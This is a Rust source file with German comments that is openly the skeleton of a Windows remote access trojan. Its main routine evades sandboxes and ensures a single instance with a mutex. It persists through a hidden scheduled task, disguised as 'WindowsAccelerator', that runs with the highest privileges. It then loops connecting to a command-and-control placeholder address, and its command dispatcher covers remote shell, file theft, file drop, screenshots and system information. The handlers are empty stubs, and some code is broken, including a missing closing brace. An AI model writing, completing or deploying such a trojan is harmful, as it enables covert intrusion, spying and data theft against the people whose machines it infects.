#![windows_subsystem = "windows"]

mod xor_data {
    include!(concat!(env!("OUT_DIR"), "/xor_data.rs"));
}
mod xor;
use xor::Secret;

use std::ffi::CString;
// WinAPI-Typen
type HMODULE = isize;
type HANDLE = isize;
type DWORD = u32;
type LPVOID = usize;
type BOOL = i32;
#[allow(non_camel_case_types)]
type ULONG_PTR = usize;


extern "system" {
    fn GetModuleHandleA(lpModuleName: *const u8) -> HMODULE;
    fn CreateMutexW(lpMutexAttributes: *const u8, bInitialOwner: BOOL, lpName: *const u16) -> HANDLE;
    fn GetLastError() -> DWORD;
    fn CloseHandle(hObject: HANDLE) -> BOOL;
    fn CreateProcessA(
        lpApplicationName: *const u8,
        lpCommandLine: *const u8,
        lpProcessAttributes: *const u8,
        lpThreadAttributes: *const u8,
        bInheritHandles: BOOL,
        dwCreationFlags: DWORD,
        lpEnvironment: *const u8,
        lpCurrentDirectory: *const u8,
        lpStartupInfo: *const u8,
        lpProcessInformation: *const u8,
    ) -> BOOL;
    // Weitere APIs (CreateToolhelp32Snapshot, Process32FirstW, RegOpenKeyExA, RegQueryValueExA, ...)
}

// Hilfskonstanten
const ERROR_ALREADY_EXISTS: DWORD = 183;
const CREATE_NO_WINDOW: DWORD = 0x08000000;

use std::net::TcpStream;
use std::io::{Read, Write};
use std::time::{Duration, Instant};
use std::thread;
use std::process;

const C2_ADDR: &str = "YOUR_C2_IP:6666"; // ändere das!
const RECONNECT_DELAY: u64 = 15; // Sekunden

fn main() {

 if is_analysis_environment() {
        // Verzögere Ausführung, damit Sandboxen Timeout kriegen
        thread::sleep(Duration::from_secs(300));
        // Wenn nach 5 Minuten immer noch Sandbox, beende
        if is_analysis_environment() {
            process::exit(0);
        }
    }

    // 2. Mutex – nur eine Instanz
    let mutex_name_wide: Vec<u16> = Secret::MutexName.to_string()
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    unsafe {
        let h = CreateMutexW(
            std::ptr::null(),
            0,
            mutex_name_wide.as_ptr(),
        );
        if GetLastError() == ERROR_ALREADY_EXISTS {
            process::exit(0);
        }
        // mutex nie schließen – bleibt bis zum Prozessende
    }

    // 3. Persistenz sicherstellen (nur einmal ausführen)
    ensure_persistence();

    // 4. Haupt-C2-Schleife
    loop {
        match TcpStream::connect(C2_ADDR) {
            Ok(mut stream) => {
                handle_session(&mut stream);
            }
            Err(_) => {
                thread::sleep(Duration::from_secs(RECONNECT_DELAY));
            }
        }
    }
}
fn get_total_disk_size_c() -> u64 {
    // Nutze GetDiskFreeSpaceExA
    unsafe {
        // Hier müsste man die API dynamisch binden, aber zur Vereinfachung
        // nimmst du die raw-WinAPI-Strukturen (aus Platzgründen ausgelassen)
        250_000_000_000 // dummy > 60 GB, echte Implementierung einfügen!
    }

fn check_bad_processes() -> bool {
   
    false // Platzhalter
}
// --- Persistenz ---
fn ensure_persistence() {
    // Scheduled Task, der bei Anmeldung den RAT startet
    let cmd = Secret::PsSchtaskBase.to_string() 
        + " \\\""
        + &std::env::current_exe().unwrap().to_string_lossy()
        + "\\\"\"";
    let _ = std::process::Command::new("schtasks")
        .args(&["/Create", "/SC", "ONLOGON", "/TN", "WindowsAccelerator", "/TR", &cmd, "/F", "/RL", "HIGHEST"])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
}

// --- Session‑Handling mit XOR‑Chiffre ---
fn handle_session(stream: &mut TcpStream) {
    // 1. Sende 4‑Byte Nonce (Zufall)
    let nonce: [u8; 4] = rand_bytes(); // muss implementiert werden
    stream.write_all(&nonce).unwrap();
// 2. Ab hier wird alles mit nonce[0] ^ nonce[3] als XOR‑Key verschlüsselt
    let xor_key = nonce[0] ^ nonce[1] ^ nonce[2] ^ nonce[3];
    let mut buf = [0u8; 4096];
    loop {
        let n = stream.read(&mut buf).unwrap();
        if n == 0 { break; }
        let mut dec = buf[..n].to_vec();
        for b in &mut dec { *b ^= xor_key; }
        // erstes Byte = Kommandotyp
        let cmd_type = dec[0];
        let payload = &dec[1..];
        match cmd_type {
            0x01 => cmd_exec(&xor_key, stream, payload),      // Shell
            0x02 => cmd_steal_file(&xor_key, stream, payload),// Datei senden
            0x03 => cmd_drop_file(&xor_key, stream, payload), // Datei empfangen
            0x04 => cmd_screenshot(&xor_key, stream),         // Bildschirmfoto
            0x05 => cmd_sysinfo(&xor_key, stream),            // Systeminfo
            _ => {}
        }
    }
}

// --- Kommandos (Platzhalter) ---
fn cmd_exec(key: &u8, stream: &mut TcpStream, payload: &[u8]) { /* ... */ }
fn cmd_steal_file(key: &u8, stream: &mut TcpStream, path: &[u8]) { /* ... */ }
fn cmd_drop_file(key: &u8, stream: &mut TcpStream, first_chunk: &[u8]) { /* ... */ }
fn cmd_screenshot(key: &u8, stream: &mut TcpStream) { /* ... */ }
fn cmd_sysinfo(key: &u8, stream: &mut TcpStream) { /* ... */ }
